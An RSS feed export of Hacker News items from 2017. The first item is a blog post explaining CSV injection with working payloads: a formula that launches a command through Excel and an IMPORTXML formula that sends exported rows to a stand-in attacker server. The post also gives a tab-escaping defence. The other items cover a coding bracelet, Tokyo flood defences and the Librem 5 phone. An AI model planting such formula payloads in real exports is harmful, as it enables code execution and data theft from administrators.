<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>Dangers of CSV Injection</title>
<link>http://georgemauer.net/2017/10/07/csv-injection.html</link>
<guid isPermaLink="true" >http://georgemauer.net/2017/10/07/csv-injection.html</guid>
<description>&lt;p&gt;I’ve been doing the local usergroup circuit with this lately and have been asked to write it up.&lt;/p&gt;
&lt;p&gt;In some ways this is old news, but in other ways…well, I think few realize how absolutely devastating and omnipresent this vulnerability can be. It is an attack vector available in every application I’ve ever seen that takes user input and allows administrators to bulk export to CSV.&lt;/p&gt;
&lt;p&gt;That is just about every application.&lt;/p&gt;
&lt;p&gt;So let’s set the scene - imagine a time or ticket tracking app. Users enter their time (or tickets) but cannot view those of other users. A site administrator then comes along and exports entries to a csv file, opening it up in a spreadsheet application. Pretty standard stuff.&lt;/p&gt;

&lt;p&gt;So we all know csv files. Their defining characteristic is that they are simple. These exports might look like this&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;22&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;UserId,BillToDate,ProjectName,Description,DurationMinutes
1,2017-07-25,Test Project,Flipped the jibbet,60
2,2017-07-25,Important Client,&quot;Bop, dop, and giglip&quot;, 240
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Simple enough. Nothing dangerous there. Heck the &lt;a href=&quot;https://tools.ietf.org/html/rfc4180&quot;&gt;RFC&lt;/a&gt; even states:&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;CSV files contain passive text data that should not pose any risks.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So even by specification, it should all be fine.&lt;/p&gt;
&lt;p&gt;Hey, just for fun let’s try something, let’s modify our CSV file to the following&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;27&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;UserId,BillToDate,ProjectName,Description,DurationMinutes
1,2017-07-25,Test Project,Flipped the jibbet,60
2,2017-07-25,Important Client,&quot;Bop, dop, and giglip&quot;, 240
2,2017-07-25,Important Client,&quot;=2+5&quot;, 240
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div&gt;&lt;img src=&quot;http://georgemauer.net/img/csv-injection/excel-formula.png&quot; alt=&quot;Formulas evaluate in Excel&quot;/&gt;&lt;img src=&quot;http://georgemauer.net/img/csv-injection/gsheets-formula.png&quot; alt=&quot;Formulas evaluate in Google Sheets&quot;/&gt;&lt;/div&gt;
In Excel (left) and imported into Google Sheets (right)
&lt;p&gt;Huh…well that’s odd. Even though that cell was quoted it seems to have been interpreted as a formula just because the first character was an &lt;code class=&quot;highlighter-rouge&quot;&gt;=&lt;/code&gt; symbol. In fact - in Excel at least - any of the symbols &lt;code class=&quot;highlighter-rouge&quot;&gt;=&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;-&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;+&lt;/code&gt;, or &lt;code class=&quot;highlighter-rouge&quot;&gt;@&lt;/code&gt; will trigger this behavior causing lots of fun times for adminstrators whose data just doesn’t seem to format correctly (this is actually what brought my attention first to the issue). That’s strange, but not downright &lt;strong&gt;dangerous&lt;/strong&gt;, right?&lt;/p&gt;
&lt;p&gt;Well hold on, a formula &lt;em&gt;is&lt;/em&gt; code that executes. So a user can cause code - even if its only formula code - to execute on an administrator’s machine in &lt;em&gt;their user’s&lt;/em&gt; security context.&lt;/p&gt;
&lt;p&gt;What if we change our csv file to this then? (Note the Description column on the last line)&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;27&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;UserId,BillToDate,ProjectName,Description,DurationMinutes
1,2017-07-25,Test Project,Flipped the jibbet,60
2,2017-07-25,Important Client,&quot;Bop, dop, and giglip&quot;, 240
2,2017-07-25,Important Client,&quot;=2+5+cmd|' /C calc'!A0&quot;, 240
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;What’s going to happen when we open up in Excel?&lt;/p&gt;
&lt;img src=&quot;http://georgemauer.net/img/csv-injection/calc.png&quot; alt=&quot;calc will open!&quot;/&gt; Holy Crap!
&lt;p&gt;Yup, that’s right, the system calculator opens right on up.&lt;/p&gt;
&lt;p&gt;Now to be fair, there &lt;em&gt;is absolutely a warning&lt;/em&gt;. It’s just that the warning is a big block of text, which nobody is going to read. And even if they do, it explicitly recommends:&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;Only click yes if you trust the source of this workbook&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And you know what? This an export from an application that &lt;em&gt;they&lt;/em&gt; are the administrator of. Of course they trust the source!&lt;/p&gt;
&lt;p&gt;Are they a technically savvy user? Then it is even worse. They &lt;em&gt;know&lt;/em&gt; the CSV format is just text data, there can’t possibly be anything harmful in there. Guaranteed.&lt;/p&gt;
&lt;p&gt;And just like that, the attacker has free reign to download a keylogger, install things, and overall remotely execute code not merely on any other person’s computer, but on that of someone guaranteed to have access to all user’s data; for example a manager or a company adminstrator. I wonder what other sort of files they might have lying around?&lt;/p&gt;


&lt;p&gt;Ok, the above is cute and all, but it is after all a (little) &lt;a href=&quot;https://www.owasp.org/index.php/CSV_Excel_Macro_Injection&quot;&gt;known vulnerability&lt;/a&gt;. As a security professional, you might make sure to warn all your administrators to be extra careful with Excel and maybe even consider using Google Sheets instead. After all, Sheets can’t be affected by macros, can it?&lt;/p&gt;
&lt;p&gt;That is indeed correct. So let’s pull back on our “run anything we want” ambitions and instead focus on merely stealing data. After all, the premise here is that the attacker is an ordinary user who can access only what they themselves input in the system. An Admin has elevated rights and can see everyone’s data, can we compromise this somehow?&lt;/p&gt;
&lt;p&gt;Well recall that while we cannot run macros in Google Sheets, we &lt;em&gt;can&lt;/em&gt; absolutely run formulas. And formulas don’t have to be limited to simple arithmetic. In fact, are there any Google Sheets commands available in formulas that can send data elsewhere? Why yes, there seem to be quite a few. But lets take a look at &lt;a href=&quot;https://support.google.com/docs/answer/3093342?hl=en&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IMPORTXML&lt;/code&gt;&lt;/a&gt; in particular.&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;IMPORTXML(url, xpath_query)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This will, when it runs, preform an HTTP GET request to the url, then attempt to parse and insert returned data in our spreadsheet. Starting to see it yet?&lt;/p&gt;
&lt;p&gt;Well what if our csv file contains:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;29&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;UserId,BillToDate,ProjectName,Description,DurationMinutes
1,2017-07-25,Test Project,Flipped the jibbet,60
2,2017-07-25,Important Client,&quot;Bop, dop, and giglip&quot;, 240
2,2017-07-25,Important Client,&quot;=IMPORTXML(CONCAT(&quot;&quot;http://some-server-with-log.evil?v=&quot;&quot;, CONCATENATE(A2:E2)), &quot;&quot;//a&quot;&quot;)&quot;,240
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The attacker starts the cell with their trusty &lt;code class=&quot;highlighter-rouge&quot;&gt;=&lt;/code&gt; symbol prefix and then points &lt;code class=&quot;highlighter-rouge&quot;&gt;IMPORTXML&lt;/code&gt; to a server they control, appending as a querystring of spreadsheet data. Now they can open up their server log and &lt;strong&gt;bam&lt;/strong&gt;! Data that isn’t theirs. &lt;a href=&quot;https://requestb.in/&quot;&gt;Try it yourself with a Requestb.in&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The ultra sinister thing here? No warnings, no popups, no reason to think that anything is amiss. The attacker just enters a similarly formatted time/issue/whatever entry, eventually an administrator attempts to view a CSV export and all that limited-access data is immediately, and queitly sent away.&lt;/p&gt;
&lt;p&gt;But wait, &lt;strong&gt;there’s more&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;This formula is running in the administrator’s browser under &lt;em&gt;their&lt;/em&gt; user account and security context. And this is Google Sheets - Sheets are not limited to just their own data, in fact they can pull in data from &lt;a href=&quot;https://support.google.com/docs/answer/3093340&quot;&gt;&lt;em&gt;other&lt;/em&gt; spreadsheets&lt;/a&gt; that the user has access to. All that an attacker has to know is the other sheet’s id. That information isn’t usually considered secret; it appears in the spreadsheet urls, and will often be accidentally emailed, or posted in intra-company documentation, relying on Google’s security to ensure only authorized users access that data.&lt;/p&gt;
&lt;p&gt;So hey, it’s not &lt;em&gt;just&lt;/em&gt; your issue/time sheet/whatever data that’s getting exfiltrated. Keep client lists or wage info in a separate spreadsheet that your admin has access to? That info might be getting sucked up as well! All silently, and without anyone knowing anything about it. Yikes!&lt;/p&gt;
&lt;p&gt;Of course a similar trick works perfectly well in Excel. In fact, the ability for Excel to act as a beacon in this manner &lt;a href=&quot;https://www.thedailybeast.com/this-is-how-cops-trick-dark-web-drug-dealers-into-unmasking-themselves&quot;&gt;has already been exploited by police to track criminals&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;But it doesn’t have to be.&lt;/p&gt;
&lt;p&gt;I’ve shown this to various security researchers who’ve pointed out all sorts of nasty uses. For example a criminal who plants messages in their own communications that would beacon a server that they control. That way, if a reseracher working on a secret warrant is to view their communication in a spreadsheet, a beacon goes out and the criminal has a canary effectively tipping them off that someone is snooping.&lt;/p&gt;
&lt;p&gt;Not ideal.&lt;/p&gt;

&lt;p&gt;So who’s fault is all of this anyways?&lt;/p&gt;
&lt;p&gt;Well it’s not the CSV format’s. The format itself couldn’t be more clear that automatically executing anything that “looks like a formula” is not an intended usage. The bug therefore lies in popular Spreadsheet programs for doing the exact wrong thing. Of course Google Sheets must maintain feature parity with Excel, and Excel must support millions of complex spreadsheets already in existance. Also - I’m not going to research this but - even odds that Excel behavior came from something ancient like Lotus Notes. Getting all spreadsheet programs to change this behavior at this point is a pretty big mountain to counquer. I suppose that it’s everyone else that must change.&lt;/p&gt;
&lt;aside id=&quot;csv-injection-google-note&quot; readability=&quot;7&quot;&gt;&lt;p&gt;I did report this to Google as a vulnerability in their Sheets product. They agreed to it, but claimed to already be aware. While I'm sure they understand it is a vulnerability, I got the distinct impression that they had not really pondered how badly this could be abused in practice. Google Sheets should at least issue a warning when a CSV import is about to preform an external request.&lt;/p&gt;
&lt;/aside&gt;&lt;p&gt;But putting it on application developers is not really practical either. After all, There is no reason for your average developer creating an export feature in a simple busineess application to so much as suspect the issue. In fact, they can read the darn RFC and &lt;em&gt;still&lt;/em&gt; not have any clue.&lt;/p&gt;
&lt;p&gt;And how do you prevent this anyways?&lt;/p&gt;
&lt;p&gt;Well, despite plentiful advice on StackOverflow and elsewhere, I’ve found only one (undocumented) thing that works with any sort of reliability:&lt;/p&gt;
&lt;p&gt;For any cell that begins with one of the formula triggering characters &lt;code class=&quot;highlighter-rouge&quot;&gt;=&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;-&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;+&lt;/code&gt;, or &lt;code class=&quot;highlighter-rouge&quot;&gt;@&lt;/code&gt;, you should directly prefix it with a tab character. Note that if there are quotes, this character goes &lt;em&gt;inside of the quotes&lt;/em&gt;.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;27&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;UserId,BillToDate,ProjectName,Description,DurationMinutes
1,2017-07-25,Test Project,Flipped the jibbet,60
2,2017-07-25,Important Client,&quot;Bop, dop, and giglip&quot;, 240
2,2017-07-25,Important Client,&quot; =2+5&quot;, 240
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It’s bizarre, but it works, and the tab character doesn’t show up visually on Excel, or Google Sheets. So do that I guess?&lt;/p&gt;
&lt;p&gt;Unfortunately that’s not the end of the story. The character might not show up, but it is still there. A quick string length check with &lt;code class=&quot;highlighter-rouge&quot;&gt;=LEN(D4)&lt;/code&gt; will confirm that. Therefore, it is only an acceptable solution so long as that cell value is only viewed visually and not then read out of the file later by a program. Further, inserting this character will lead to odd inconsistencies. The csv format is used for interchange &lt;strong&gt;between applications&lt;/strong&gt;. Meaning that an escaped cell exported from one application will import into another with the excape character as a part of the data.&lt;/p&gt;
&lt;p&gt;The nasty end result is that when generating the csv export you &lt;strong&gt;must know how the export is to be used&lt;/strong&gt;.&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;If it is to be used in a spreadsheet application by a user to calculate things visually, you should escape things with a tab. This is actually even more important since you wouldn’t want the string “-2+3” in a programming language appearing as &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; when exported to a spreadsheet.&lt;/li&gt;
&lt;li&gt;If it is to be used as an interchange format then do not escape anything.&lt;/li&gt;
&lt;li&gt;If you do not know or if it is to be used in a spreadsheet application or then later that spreadsheet will be used as an import source for software, give up, swear off the world, get yourself a cabin with the woods and maybe try being friends with squirrels for a while. (Alternately, use Excel but &lt;em&gt;always&lt;/em&gt; disconnect from the network and follow all security prompts while doing any work).&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;It’s a nightmare of a scenario, it’s sinister, damaging, and with no clear solution. Its also something that should be far far better known than it currently is.&lt;/p&gt;

</description>
<pubDate>Tue, 10 Oct 2017 02:37:57 +0000</pubDate>
<dc:creator>rpenm</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>http://georgemauer.net/2017/10/07/csv-injection.html</dc:identifier>
</item>
<item>
<title>Jewelbots – A Friendship Bracelet You Can Code</title>
<link>https://jewelbots.com/</link>
<guid isPermaLink="true" >https://jewelbots.com/</guid>
<description>[unable to retrieve full-text content]&lt;p&gt;Article URL: &lt;a href=&quot;https://jewelbots.com/&quot;&gt;https://jewelbots.com/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Comments URL: &lt;a href=&quot;https://news.ycombinator.com/item?id=15437242&quot;&gt;https://news.ycombinator.com/item?id=15437242&lt;/a&gt;&lt;/p&gt;&lt;p&gt;Points: 210&lt;/p&gt;&lt;p&gt;# Comments: 117&lt;/p&gt;
&lt;hr&gt;&lt;p&gt;hnrss is a labor of love, but if the project has made your job
or hobby project easier and you want to show some gratitude, &lt;a
href=&quot;https://donate.hnrss.org/&quot;&gt;donations are very much
appreciated&lt;/a&gt;. PayPal and Bitcoin both accepted. Thanks!&lt;/p&gt;
        </description>
<pubDate>Mon, 09 Oct 2017 20:35:52 +0000</pubDate>
<dc:creator>le-mark</dc:creator>
<og:type>website</og:type>
<og:title>Jewelbots Friendship Bracelets - STEM for Best Friends</og:title>
<og:image>http://cdn.shopify.com/s/files/1/0935/5176/t/10/assets/jewelbots-icon.png?12103894889579450626</og:image>
<og:description>Smart jewelry for smart girls. Get your hands on the 21st century bluetooth enabled toy she loves to code.</og:description>
<og:url>https://jewelbots.com/</og:url>
<dc:format>text/html</dc:format>
<dc:identifier>https://jewelbots.com/</dc:identifier>
</item>
<item>
<title>Tokyo Is Preparing for Floods ‘Beyond Anything We’ve Seen’</title>
<link>https://www.nytimes.com/2017/10/06/climate/tokyo-floods.html?ribbon-ad-idx=4&amp;rref=climate</link>
<guid isPermaLink="true" >https://www.nytimes.com/2017/10/06/climate/tokyo-floods.html?ribbon-ad-idx=4&amp;rref=climate</guid>
<description>&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;251&quot; data-total-count=&quot;5242&quot; id=&quot;story-continues-15&quot;&gt;Still, the Kasukabe operation remains a critical part of Tokyo’s defenses, say officials at Japan’s Land Ministry, which runs the site. Five vertical, underground cisterns, almost 250 feet deep, take in storm water from four rivers north of Tokyo.&lt;/p&gt;&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;325&quot; data-total-count=&quot;5567&quot;&gt;A series of tunnels connect the cisterns to a vast tank, larger than a soccer field, with ceilings held up by 60-foot pillars that give the space a temple-like feel. From that tank, industrial pumps discharge the floodwater at a controlled pace into the Edo river, a larger river system that flushes the water into Tokyo Bay.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;162&quot; data-total-count=&quot;5729&quot;&gt;Between floods, site managers run tours of the facility, inviting members of the public to walk on the floor of the vast tank and to peer into the murky cisterns.&lt;/p&gt;
&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;176&quot; data-total-count=&quot;5905&quot;&gt;“This is another important role,” said Mr. Abe’s deputy, Yasuyuki Osa, after a recent tour, “to get people to think about the danger of floods, and how we can adapt.”&lt;/p&gt;
&lt;a class=&quot;visually-hidden skip-to-text-link&quot; href=&quot;https://www.nytimes.com/2017/10/06/climate/tokyo-floods.html?ribbon-ad-idx=4&amp;amp;rref=climate#whats-next&quot;&gt;Continue reading the main story&lt;/a&gt;</description>
<pubDate>Mon, 09 Oct 2017 19:56:51 +0000</pubDate>
<dc:creator>blondie9x</dc:creator>
<og:url>https://www.nytimes.com/2017/10/06/climate/tokyo-floods.html</og:url>
<og:type>article</og:type>
<og:title>Tokyo Is Preparing for Floods ‘Beyond Anything We’ve Seen’</og:title>
<og:description>Japan has spent billions on an underground system to control water around the capital, but some fear that the city is vulnerable as global warming brings more extreme weather.</og:description>
<og:image>https://static01.nyt.com/images/2017/10/05/science/00CLI-TOKYOFLOOD1/00CLI-TOKYOFLOOD1-facebookJumbo.jpg</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.nytimes.com/2017/10/06/climate/tokyo-floods.html?ribbon-ad-idx=4&amp;rref=climate</dc:identifier>
</item>
<item>
<title>Librem 5 Phone Funded</title>
<link>https://puri.sm/shop/librem-5/</link>
<guid isPermaLink="true" >https://puri.sm/shop/librem-5/</guid>
<description>
&lt;p&gt;Freedom of Choice&lt;/p&gt;
&lt;p&gt;We believe phones should not track you nor exploit your digital life. We are in the middle of a digital rights revolution where you get to decide the future. We at Purism are building a phone that does not run Android nor iOS, but runs PureOS or any GNU/Linux distribution where all the source code is available.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://puri.sm/wp-content/uploads/2017/08/activitiescall.png&quot;&gt;&lt;img src=&quot;https://puri.sm/wp-content/uploads/2017/08/activitiescall-1024x670.png&quot; alt=&quot;&quot; width=&quot;960&quot; height=&quot;628&quot; class=&quot;alignnone size-large wp-image-20990&quot;/&gt;&lt;/a&gt;&lt;br/&gt;&lt;em&gt;Note that the visual design of the phone is a work in progress and is subject to evolve based on technical requirements and people’s feedback.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Peace of Mind&lt;/p&gt;
&lt;p&gt;Our phone will not wholesale gather your data for profit. It will not lock you into an ecosystem that controls you. It will not require you to enter banking details to simply get an app from an app store.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://puri.sm/wp-content/uploads/2017/08/IM-front-1.png&quot; alt=&quot;&quot; width=&quot;300&quot; class=&quot;alignright size-full wp-image-24731&quot; srcset=&quot;https://puri.sm/wp-content/uploads/2017/08/IM-front-1.png 540w, https://puri.sm/wp-content/uploads/2017/08/IM-front-1-238x300.png 238w&quot; sizes=&quot;(max-width: 540px) 100vw, 540px&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Does Not Track You&lt;/p&gt;
&lt;p&gt;Our phone will be built to protect you by default. It will never exploit you for profit. It will be a phone for the people, by the people.&lt;/p&gt;
&lt;p&gt;High Quality&lt;/p&gt;
&lt;p&gt;We know how to build products that are convenient, privacy and security focused. Our phone will give you peace of mind knowing it does not track you.&lt;/p&gt;

&lt;hr/&gt;
&lt;ul class=&quot;bullets&quot;&gt;&lt;li&gt;Does not run Google Android&lt;/li&gt;
&lt;li&gt;Does not run Apple iOS&lt;/li&gt;
&lt;li&gt;Runs PureOS by default, can run most GNU+Linux distributions&lt;/li&gt;
&lt;li&gt;World’s first ever IP-native mobile handset&lt;/li&gt;
&lt;li&gt;End-to-end encrypted decentralized communications via Matrix&lt;/li&gt;
&lt;li&gt;5″ screen&lt;/li&gt;
&lt;li&gt;Security focused by design&lt;/li&gt;
&lt;li&gt;Privacy protection by default&lt;/li&gt;
&lt;li&gt;Works with 2G/3G/4G, GSM, UMTS, and LTE networks&lt;/li&gt;
&lt;li&gt;CPU separate from Baseband&lt;/li&gt;
&lt;li&gt;Hardware Kill Switches for Camera, Microphone, WiFi/Bluetooth, and Baseband&lt;/li&gt;
&lt;/ul&gt;&lt;hr/&gt;
&lt;p&gt;This is an “all-or-nothing” campaign. If there is not enough backers, credit cards are not charged. What this means is there is no risk to support early and spread the word. Your credit card is only pre-authorized to show support, once we cross the funding goal then your card is charged the amount. From past experience, and the way crowdfunding works, we are already way ahead of the expected trend line to succeed. If you were waiting in the sidelines, but want the Librem 5 to succeed giving you a phone that respects your digital rights, offers you to run any GNU/Linux distribution (since we abide by an “upstream first” contribution methodology), and change the future for the better, back this campaign now (and pay later).&lt;/p&gt;
&lt;hr/&gt;

&lt;hr/&gt;
&lt;table id=&quot;tablepress-26&quot; class=&quot;tablepress tablepress-id-26&quot;&gt;&lt;thead&gt;&lt;tr class=&quot;row-1 odd&quot;&gt;&lt;th class=&quot;column-1&quot;&gt; &lt;/th&gt;
&lt;th class=&quot;column-2&quot;&gt;
&lt;p&gt;Purism PureOS&lt;/p&gt;
&lt;/th&gt;
&lt;th class=&quot;column-3&quot;&gt;
&lt;p&gt;Apple iOS&lt;/p&gt;
&lt;/th&gt;
&lt;th class=&quot;column-4&quot;&gt;
&lt;p&gt;Google Android&lt;/p&gt;
&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;7&quot;&gt;&lt;tr class=&quot;row-2 even&quot;&gt;&lt;td class=&quot;column-1&quot;&gt;User Controls Device&lt;/td&gt;
&lt;td class=&quot;column-2&quot;&gt;
&lt;p&gt;&lt;span&gt;Yes&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td class=&quot;column-3&quot;&gt;
&lt;p&gt;&lt;span&gt;No&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td class=&quot;column-4&quot;&gt;
&lt;p&gt;&lt;span&gt;No&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;row-3 odd&quot; readability=&quot;2&quot;&gt;&lt;td class=&quot;column-1&quot;&gt;Trackers Disabled by Default&lt;/td&gt;
&lt;td class=&quot;column-2&quot;&gt;
&lt;p&gt;&lt;span&gt;Yes&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td class=&quot;column-3&quot;&gt;
&lt;p&gt;&lt;span&gt;No&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td class=&quot;column-4&quot;&gt;
&lt;p&gt;&lt;span&gt;No&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;row-4 even&quot; readability=&quot;2&quot;&gt;&lt;td class=&quot;column-1&quot;&gt;Privacy Protection By Default&lt;/td&gt;
&lt;td class=&quot;column-2&quot;&gt;
&lt;p&gt;&lt;span&gt;Yes&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td class=&quot;column-3&quot;&gt;
&lt;p&gt;&lt;span&gt;No&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td class=&quot;column-4&quot;&gt;
&lt;p&gt;&lt;span&gt;No&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;row-5 odd&quot;&gt;&lt;td class=&quot;column-1&quot;&gt;Does Not Track You&lt;/td&gt;
&lt;td class=&quot;column-2&quot;&gt;
&lt;p&gt;&lt;span&gt;Yes&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td class=&quot;column-3&quot;&gt;
&lt;p&gt;&lt;span&gt;No&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td class=&quot;column-4&quot;&gt;
&lt;p&gt;&lt;span&gt;No&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;row-6 even&quot; readability=&quot;2&quot;&gt;&lt;td class=&quot;column-1&quot;&gt;Layered Security Protection&lt;/td&gt;
&lt;td class=&quot;column-2&quot;&gt;
&lt;p&gt;&lt;span&gt;Yes&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td class=&quot;column-3&quot;&gt;
&lt;p&gt;&lt;span&gt;No&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td class=&quot;column-4&quot;&gt;
&lt;p&gt;&lt;span&gt;No&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;row-7 odd&quot; readability=&quot;2&quot;&gt;&lt;td class=&quot;column-1&quot;&gt;User Controlled Source Code&lt;/td&gt;
&lt;td class=&quot;column-2&quot;&gt;
&lt;p&gt;&lt;span&gt;Yes&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td class=&quot;column-3&quot;&gt;
&lt;p&gt;&lt;span&gt;No&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td class=&quot;column-4&quot;&gt;
&lt;p&gt;&lt;span&gt;No&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;row-8 even&quot;&gt;&lt;td class=&quot;column-1&quot;&gt;Runs GNU+Linux&lt;/td&gt;
&lt;td class=&quot;column-2&quot;&gt;
&lt;p&gt;&lt;span&gt;Yes&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td class=&quot;column-3&quot;&gt;
&lt;p&gt;&lt;span&gt;No&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td class=&quot;column-4&quot;&gt;
&lt;p&gt;&lt;span&gt;No&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;row-9 odd&quot; readability=&quot;2&quot;&gt;&lt;td class=&quot;column-1&quot;&gt;Separates CPU from Cellular Baseband&lt;/td&gt;
&lt;td class=&quot;column-2&quot;&gt;
&lt;p&gt;&lt;span&gt;Yes&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td class=&quot;column-3&quot;&gt;
&lt;p&gt;&lt;span&gt;No&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td class=&quot;column-4&quot;&gt;
&lt;p&gt;&lt;span&gt;No&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;row-10 even&quot; readability=&quot;2&quot;&gt;&lt;td class=&quot;column-1&quot;&gt;IP-Native Communication First&lt;/td&gt;
&lt;td class=&quot;column-2&quot;&gt;
&lt;p&gt;&lt;span&gt;Yes&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td class=&quot;column-3&quot;&gt;
&lt;p&gt;&lt;span&gt;No&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td class=&quot;column-4&quot;&gt;
&lt;p&gt;&lt;span&gt;No&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;row-11 odd&quot; readability=&quot;2&quot;&gt;&lt;td class=&quot;column-1&quot;&gt;Decentralized Communication by Default&lt;/td&gt;
&lt;td class=&quot;column-2&quot;&gt;
&lt;p&gt;&lt;span&gt;Yes&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td class=&quot;column-3&quot;&gt;
&lt;p&gt;&lt;span&gt;No&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td class=&quot;column-4&quot;&gt;
&lt;p&gt;&lt;span&gt;No&lt;/span&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;hr/&gt;
&lt;p&gt;&lt;img src=&quot;https://puri.sm/wp-content/uploads/2016/11/librem_family-300x214.jpg&quot; alt=&quot;&quot; width=&quot;300&quot; height=&quot;214&quot; class=&quot;alignright size-medium wp-image-20930&quot;/&gt;Purism has built and delivered laptops successfully for over 2 years and is now ready to begin development on a phone product.&lt;/p&gt;
&lt;p&gt;We are focusing on creating a secure communication device, and will continually expand the product through software with community and developer support.&lt;/p&gt;
